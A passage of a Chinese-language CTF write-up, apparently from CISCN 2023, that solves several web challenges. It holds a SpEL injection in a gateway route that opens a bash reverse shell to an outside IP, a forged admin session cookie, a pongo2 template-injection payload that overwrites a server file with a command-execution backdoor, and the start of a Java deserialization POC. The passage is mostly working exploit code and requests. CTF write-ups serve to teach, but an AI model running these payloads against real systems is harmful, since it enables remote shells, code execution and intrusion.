class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lb://service-provider&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">              <span class="string">&quot;Path=/echo/**&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">              <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;result&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/101.42.39.110/3389 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230531105642291.png" alt="image-20230531105642291"></p><p>这些地方跟着jar里的设置就行</p><p>写好，点击发布shell就会自动反弹了</p><p><img src="../images/image-20230531105827280.png" alt="image-20230531105827280"></p><p><strong>这题当时，没注意到jar包里的内容，老是去搜索这个nacos的版本漏洞，导致最后没成功</strong></p><h2 id="gosession-go-ssti-flask"><a href="#gosession-go-ssti-flask" class="headerlink" title="gosession(go-ssti-flask)"></a>gosession(go-ssti-flask)</h2><p><strong>route.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;html&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个一共有三个路由</p><ul><li>Index</li><li>Admin</li><li>Flask</li></ul><p><strong>先看Index路由</strong></p><p>Index路由内容很简单，直接赋了个session，session中的name值为guest，这⾥发现 session的key是通过SESSION_KEY环境变量获取的</p><p><img src="../images/image-20230530163802857.png" alt="image-20230530163802857"></p><p>这里的<code>err</code>是指，如果有报错的话，会把报错信息赋给这个<code>err</code></p><p>这里的<code>nil</code>是和<code>null</code>一个意思</p><p><strong>再看Admin路由：</strong></p><ul><li>这⾥对session做了验证，需要name为admin </li><li>这⾥⽤pongo2做模板渲染，存在模板渲染漏洞</li></ul><p><img src="../images/image-20230530164112496.png" alt="image-20230530164112496"></p><p><strong>接着看Flask路由：</strong></p><p>Flask路由会请求靶机⾥5000端⼝服务，并把请求⻚⾯回显</p><p><img src="../images/image-20230530164124171.png" alt="image-20230530164124171"></p><p>这里的入口点就是在这个Flask路由这里</p><p>通过使其报错<code>flask/?name=/</code> 得到下面的源码   <strong>server.py</strong></p><p><img src="../images/image-20230530164429706.png" alt="image-20230530164429706"></p><p>5000端⼝为python的flask服务，开启了debug模式，源码不存在ssti漏洞</p><p>(赛后复现的发现这里的<strong>seesion_key</strong>是空的。。。。。。。，当时是一直在找这个key)</p><p>接下来我们就去无key伪造session</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"> <span class="string">&quot;net/http&quot;</span></span><br><span class="line"> <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"> <span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"> <span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line"> r := gin.Default()</span><br><span class="line"> r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"> session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"> <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"> http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line"> &#125;</span><br><span class="line"> session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line"> err = session.Save(c.Request, c.Writer)</span><br><span class="line"> <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"> http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line"> &#125;</span><br><span class="line"> c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line"> &#125;)</span><br><span class="line"> r.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230530171541196.png" alt="image-20230530171541196"></p><p>根据这两个地方自己生成一个</p><p>这里的话这个代码可以在那个<code>gin</code>框架的github网站找到</p><p><img src="../images/image-20230530184301524.png" alt="image-20230530184301524"></p><p>然后加上那个seesions就行了</p><p><img src="../images/image-20230530184349321.png" alt="image-20230530184349321"></p><p>然后成功拿到伪造的<code>admin</code>的cookie</p><p><img src="../images/image-20230530184609077.png" alt="image-20230530184609077"></p><p>成功登录进admin路由</p><p>(<strong>这里使用的是go的ssti</strong>，<strong>使用的是pongo2的模板渲染</strong>)</p><p>接着构造请求包覆盖/app/server.py：</p><ul><li>注意name值需要url编码</li><li>c.HandlerName的值为<code>main/route.Admin</code>，接着用first过滤器获取到的就是<code>m</code>字符，用last过滤器获取到的就是<code>n</code>字符</li><li>注意GET请求也是可以使用表单上传文件的</li></ul><p><code>/admin?name=&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py</code></p><p>(<strong>这里听说的网上搜不到的，是靠自己翻pongo2的官方文档自己翻出来的</strong>)</p><p>这位师傅写了详细的分析流程  <a href="https://un1novvn.github.io/2023/05/29/ciscn2023/">找payload过程</a></p><p>这里的话是自己构造一个文件上传包来上传修改后的<code>server.py</code>来进行覆盖原来的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">GET /admin?name=%7B%25<span class="built_in">set</span>%<span class="number">20</span>form%3Dc.Query(c.HandlerName%7Cfirst)%<span class="number">25</span>%7D%7B%25<span class="built_in">set</span>%20path%3Dc.Query(c.HandlerName%7Clast)%<span class="number">25</span>%7D%7B%25<span class="built_in">set</span>%20file%3Dc.FormFile(form)%<span class="number">25</span>%7D%7B%7Bc.SaveUploadedFile(file%2Cpath)%7D%7D&amp;m=file&amp;n=/app/server.py HTTP/<span class="number">1.1</span></span><br><span class="line">Host: 09b6676f-dac1-439f-be8a-1032efb446cc.challenge.ctf.show</span><br><span class="line">Content-Length: <span class="number">562</span></span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryqwT9VdDXSgZPm0yn</span><br><span class="line">Cookie: session-name=MTY4NTE2OTE4MHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzUn0khtUAglbEqre0c-3PmfQg0snOpUCSYyvq07U4AKw==</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryqwT9VdDXSgZPm0yn</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;server.py&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    res = os.popen(name).read()</span><br><span class="line">    <span class="keyword">return</span> res + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryqwT9VdDXSgZPm0yn</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">------WebKitFormBoundaryqwT9VdDXSgZPm0yn--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里话为什么要构造这个(<strong>是别的师傅去翻pongo2的官方文档得出的</strong>)</p><p><img src="../images/image-20230530195427938.png" alt="image-20230530195427938"></p><p><img src="../images/image-20230530200113097.png" alt="image-20230530200113097"></p><p><code>http://09b6676f-dac1-439f-be8a-1032efb446cc.challenge.ctf.show/flask/?name=?name=cat$&#123;IFS&#125;/t*</code></p><p><strong>这里传两个name的原因是  第一个name是flask路由下的不能出错，不然会返回错误页面</strong>    </p><p>必须得让他走到访问5000端口这里，然后5000端口这里又有我们新覆盖的代码，一个name参数</p><h2 id="DeserBug"><a href="#DeserBug" class="headerlink" title="DeserBug"></a><strong>DeserBug</strong></h2><p>(后半场放出的提示<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code>)</p><p>这个题目给了jar包</p><p>这里的话我们先在本地搭一个环境来进行复现一下</p><p><img src="../images/image-20230529202349405.png" alt="image-20230529202349405"></p><p><img src="../images/image-20230529202356594.png" alt="image-20230529202356594"></p><p>搭建成功，这里的话就开始对jar包里的内容进行分析了</p><p><img src="../images/image-20230529205210683.png" alt="image-20230529205210683"></p><p><strong>这里给了一个cc3的依赖</strong></p><p><strong>Testapp.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.ContentType;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.HttpUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.server.HttpServerRequest;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.server.HttpServerResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Testapp</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    HttpUtil.createServer(<span class="number">8888</span>)</span><br><span class="line">      .addAction(<span class="string">&quot;/&quot;</span>, (request, response) -&gt; &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">bugstr</span> <span class="operator">=</span> request.getParam(<span class="string">&quot;bugstr&quot;</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">          <span class="keyword">if</span> (bugstr == <span class="literal">null</span>)</span><br><span class="line">            response.write(<span class="string">&quot;welcome,plz give me bugstr&quot;</span>, ContentType.TEXT_PLAIN.toString()); </span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] decode = Base64.getDecoder().decode(bugstr);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> inputStream.readObject();</span><br><span class="line">            result = object.toString();</span><br><span class="line">          &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line">            myexpect.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;);</span><br><span class="line">            myexpect.setTypearg((Object[])<span class="keyword">new</span> <span class="title class_">String</span>[] &#123; e.toString() &#125;);</span><br><span class="line">            myexpect.setTargetclass(e.getClass());</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              result = myexpect.getAnyexcept().toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">              result = ex.toString();</span><br><span class="line">            &#125; </span><br><span class="line">          &#125; </span><br><span class="line">          response.write(result, ContentType.TEXT_PLAIN.toString());</span><br><span class="line">        &#125;).start();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Myexpect.java</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">package com.app;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Myexpect</span> <span class="keyword">extends</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> Class[] typeparam;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> Object[] typearg;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> Class targetclass;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String name;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String anyexcept;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Class <span class="title function_ invoke__">getTargetclass</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> this.targetclass;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">setTargetclass</span>(Class targetclass) &#123;</span><br><span class="line">    this.targetclass = targetclass;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Object[] <span class="title function_ invoke__">getTypearg</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> this.typearg;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">setTypearg</span>(Object[] typearg) &#123;</span><br><span class="line">    this.typearg = typearg;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_ invoke__">getAnyexcept</span>() throws <span class="built_in">Exception</span> &#123;</span><br><span class="line">    Constructor con = this.targetclass.<span class="title function_ invoke__">getConstructor</span>(this.typeparam);</span><br><span class="line">    <span class="keyword">return</span> con.<span class="title function_ invoke__">newInstance</span>(this.typearg);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">setAnyexcept</span>(String anyexcept) &#123;</span><br><span class="line">    this.anyexcept = anyexcept;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Class[] <span class="title function_ invoke__">getTypeparam</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> this.typeparam;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">setTypeparam</span>(Class[] typeparam) &#123;</span><br><span class="line">    this.typeparam = typeparam;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_ invoke__">getName</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> this.name;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">setName</span>(String name) &#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230529212400523.png" alt="image-20230529212400523"></p><p>如何导入到idea中开始分析</p><p>这里的话先写一个恶意类</p><p><strong>Evil.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后写一个poc进行利用</p><p><strong>TmpTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.app.Myexpect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TmpTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line">        myexpect.setTargetclass(Evil.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span 